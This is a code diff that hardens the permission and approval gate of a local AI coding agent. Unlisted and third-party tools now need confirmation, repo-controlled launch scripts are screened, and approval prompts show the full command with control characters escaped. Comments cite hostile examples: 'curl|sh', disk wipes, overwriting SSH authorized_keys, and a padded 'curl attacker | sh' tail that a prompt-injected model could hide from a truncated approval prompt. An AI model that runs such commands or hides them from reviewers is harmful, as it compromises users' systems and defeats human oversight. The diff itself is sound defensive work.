@@ -69,6 +69,22 @@ _SHELL_EXEC_TOOLS = {"bash", "background_process"}
 # Tools that write file contents to a path.
 _FILE_WRITE_TOOLS = {"write_file", "append_file", "edit_file", "multi_edit", "edit_diff"}
 
+# Built-in tools that never prompt: read-only, or internally guarded
+# (the `agent` tool routes every inner call back through this gate).
+# Everything NOT on this list — and not a shell/write tool, which have
+# their own richer gating below — is confirmed before it runs. That
+# inverts the old default-allow, which let `launch_app` (executes a
+# command the REPO controls via package.json scripts) and any
+# third-party `mcp_*` tool run unattended in every mode including
+# suggest. Mirrors the default-ASK posture permissions_v2 documents.
+_NEVER_CONFIRM_TOOLS = frozenset({
+    "read_file", "grep", "glob", "list_files", "code_navigation",
+    "inspect_symbol", "todo_write", "current_datetime",
+    "web_search", "web_fetch", "skill", "agent",
+    "enter_plan_mode", "exit_plan_mode",
+    "read_state", "facts", "project_check", "syntax_check",
+})
+
 # Credential / key material that the agent has no legitimate reason to write.
 # Matched on the path BASENAME or a path SEGMENT (never a naive substring, so
 # editing the project's own `tokenizer.py` / `api_keys.py` is never blocked).
@@ -198,7 +214,7 @@ _CONFIRM_SHELL_RE = _re.compile(
 )
 
 
-def _safety_hard_block(name: str, args: dict) -> str | None:
+def _safety_hard_block(name: str, args: dict, repo_root: "Path | str | None" = None) -> str | None:
     """Autonomy-independent hard block. Returns a rejection reason, or None.
 
     Runs before every tool dispatch in ALL modes (including FULL_AUTO and
@@ -218,6 +234,23 @@ def _safety_hard_block(name: str, args: dict) -> str | None:
             for rx in _HARD_BLOCK_SHELL_RE:
                 if rx.search(cmd):
                     return "blocked: refusing a command that could destroy the disk or system (matched a catastrophic pattern)"
+    if name == "launch_app":
+        # launch_app hands the repo's own package.json script (or an
+        # inferred command) to `sh`. The string is repo-controlled, so it
+        # gets the same catastrophic-pattern screen as bash — resolved to
+        # the concrete command that would actually run.
+        action = str(args.get("action") or "start").strip().lower()
+        if action != "stop" and repo_root is not None:
+            command, _root, script = _resolve_launch_details(repo_root)
+            for text in (command, script):
+                if not text:
+                    continue
+                for rx in _HARD_BLOCK_SHELL_RE:
+                    if rx.search(text):
+                        return (
+                            "blocked: the repo's launch command matched a "
+                            "catastrophic pattern and will not be executed"
+                        )
     if name in _FILE_WRITE_TOOLS:
         raw_path = str(args.get("path", "") or args.get("file_path", "") or "")
         if raw_path:
@@ -448,7 +481,7 @@ def _execute_tool_result(app: "LocalCodeApp", name: str, args: dict, out: "Outpu
     # backstop the confirmation gate is not. A prompt-injected model cannot use
     # bash/background_process to run `curl|sh` or wipe a disk, nor a write tool
     # to overwrite ~/.ssh/authorized_keys, even with no human present.
-    _blocked = _safety_hard_block(name, args)
+    _blocked = _safety_hard_block(name, args, repo_root=getattr(app, "repo_root", None))
     if _blocked is not None:
         try:
             from ..events import emit as _emit_block
@@ -581,6 +614,111 @@ def _first_token(cmd: str) -> str:
     """
     return (cmd.strip().split() or [""])[0][:20].lower()
 
+
+def _resolve_launch_details(repo_root: "Path | str") -> tuple[str, str, str]:
+    """(command, root, underlying_script) `launch_app` would run, or ('','','').
+
+    Resolved via the launcher's own detection so the approval prompt and
+    the hard-block screen see the SAME repo-controlled strings the tool
+    would execute ("{port}" stays as a placeholder — the launcher fills
+    in a free localhost port at start time). For npm wrappers the command
+    is just `npm run dev …` — the ACTUAL repo-controlled payload is the
+    package.json script body, so that is resolved too: it must be shown
+    to the user and screened by the hard block.
+    """
+    try:
+        from ..launcher import detect_launch_candidate
+        candidate = detect_launch_candidate(repo_root)
+    except Exception:
+        return "", "", ""
+    if candidate is None:
+        return "", "", ""
+    script = ""
+    try:
+        import json as _json
+        manifest = candidate.root / "package.json"
+        if candidate.command.startswith("npm ") and manifest.is_file():
+            data = _json.loads(manifest.read_text(errors="replace"))
+            scripts = data.get("scripts") if isinstance(data, dict) else None
+            if isinstance(scripts, dict):
+                key = "dev" if "npm run dev" in candidate.command else "start"
+                script = str(scripts.get(key, "") or "")
+    except Exception:
+        script = ""
+    return candidate.command, str(candidate.root), script
+
+
+def _approval_display_command(app: "LocalCodeApp | None", name: str, args: dict) -> str:
+    """Build the string the approval prompt shows (and keys "always allow" on).
+
+    Shell tools carry a command; file-write tools carry a path. `launch_app`
+    carries NEITHER — its command comes from the repo's own manifest — so the
+    prompt must resolve and show that real command, not a blank line. MCP
+    tools show the tool name plus an args preview.
+    """
+    cmd = str(args.get("command", "") or "")
+    if cmd:
+        return cmd
+    if name == "launch_app":
+        action = str(args.get("action") or "start").strip().lower()
+        if action == "stop":
+            return "launch_app stop (SIGTERM the app process this session started)"
+        repo = getattr(app, "repo_root", None)
+        resolved, root, script = _resolve_launch_details(repo) if repo is not None else ("", "", "")
+        if resolved:
+            suffix = f"  (cwd: {root})" if root else ""
+            # For npm wrappers, show the script body too — THAT is the
+            # repo-controlled command the user is actually approving.
+            if script:
+                suffix += f'  [script: {script}]'
+            return f"launch_app {resolved}{suffix}"
+        return "launch_app (no launch command detected)"
+    path = str(args.get("path") or args.get("file_path") or "")
+    if not path and name.startswith("mcp_"):
+        try:
+            import json as _json
+            preview = _json.dumps(args, ensure_ascii=False, default=str)[:200]
+        except Exception:
+            preview = str(args)[:200]
+        return f"{name} {preview}".strip()
+    return f"{name} {path}".strip()
+
+
+def _render_approval_command(cmd: str, width: int = 76, max_chars: int = 1500) -> list[str]:
+    """Prepare a command for the CLI approval prompt: escape control
+    characters and wrap the FULL text across lines.
+
+    The old rendering was `cmd[:80]` raw: everything past column 80 was
+    invisible at approval time, and the model controls the padding — so
+    `git status <60 spaces> ; curl attacker | sh` displayed as a bare
+    `git status`. Raw control characters could also repaint the line
+    (`\\r`, cursor moves) to hide the tail. Every character is now either
+    shown or explicitly counted in a truncation marker.
+    """
+    text = str(cmd or "")
+    hidden = max(0, len(text) - max_chars)
+    if hidden:
+        text = text[:max_chars]
+    safe: list[str] = []
+    for ch in text:
+        code = ord(ch)
+        if ch == "\n":
+            safe.append(ch)
+        elif code < 0x20 or code == 0x7F:
+            safe.append(f"\\x{code:02x}")
+        else:
+            safe.append(ch)
+    lines: list[str] = []
+    for raw_line in "".join(safe).split("\n"):
+        if not raw_line:
+            lines.append("")
+            continue
+        for i in range(0, len(raw_line), width):
+            lines.append(raw_line[i:i + width])
+    if hidden:
+        lines.append(f"… [+{hidden} more characters not shown]")
+    return lines
+
 def _needs_confirmation(name: str, args: dict, app: "LocalCodeApp | None" = None) -> bool:
     """Check if this tool needs user confirmation.
 
@@ -600,12 +738,15 @@ def _needs_confirmation(name: str, args: dict, app: "LocalCodeApp | None" = None
         name == "exit_plan_mode" and bool(getattr(app, "plan_mode", False))
     )
 
-    # Tools that don't execute shell or mutate files never need confirmation.
+    # Known read-only / internally-guarded built-ins never need confirmation.
+    # NOTE the inverted default: a tool that is NOT on the never-confirm list
+    # and NOT a shell/write tool (launch_app, any `mcp_*` tool, any unknown
+    # freshly-registered tool) falls through and IS confirmed below.
     if (
         not _needs_plan_exit_ack
-        and name != "bash"
         and name not in _SHELL_EXEC_TOOLS
         and name not in _FILE_WRITE_TOOLS
+        and name in _NEVER_CONFIRM_TOOLS
     ):
         return False
 
@@ -622,6 +763,29 @@ def _needs_confirmation(name: str, args: dict, app: "LocalCodeApp | None" = None
             level = None
 
     if _needs_plan_exit_ack:
+        return True
+
+    # launch_app / mcp_* / unknown tools: always confirm on first use.
+    # `launch_app` executes a command the REPO controls (package.json
+    # scripts.dev/start); `mcp_*` tools belong to third-party servers; an
+    # unknown tool is exactly what an injected/compromised registration
+    # looks like. A session-scoped "always allow" (option 2 on the prompt)
+    # is honoured after the first approval — keyed on the tool name, which
+    # is the first token of the display command built by
+    # `_approval_display_command`.
+    if (
+        name not in _SHELL_EXEC_TOOLS
+        and name not in _FILE_WRITE_TOOLS
+        and name != "exit_plan_mode"
+    ):
+        # `launch_app stop` runs no repo-controlled command and can only
+        # SIGTERM a pid this session spawned — no prompt needed.
+        if name == "launch_app" and str(args.get("action") or "").strip().lower() == "stop":
+            return False
+        if app is not None:
+            allow = getattr(app, "_session_allow", None)
+            if allow and (name in allow or _first_token(name) in allow):
+                return False
         return True
 
     # File-write tools: auto-approved in auto_edit (the point of that mode);
@@ -695,7 +859,10 @@ def _request_approval_verdict(app: "LocalCodeApp | None", out: "OutputManager | 
     rule = app._composer_rule() if hasattr(app, "_composer_rule") else "  " + ("─" * 60)
     first_tok = _first_token(cmd) or tool_name
     sys.stdout.write("\n\033[33m  Allow this command?\033[0m\n")
-    sys.stdout.write(f"\033[2m  {cmd[:80]}\033[0m\n")
+    # Full command, wrapped and control-escaped — never a raw 80-char slice
+    # (the TUI path in chat_log.py already wraps; this matches it).
+    for _line in _render_approval_command(cmd):
+        sys.stdout.write(f"\033[2m  {_line}\033[0m\n")
     sys.stdout.write("  \033[1m1\033[0m  allow once\n")
     sys.stdout.write(f"  \033[1m2\033[0m  always allow `{first_tok}` (this session)\n")
     sys.stdout.write("  \033[1m3\033[0m  deny\n")
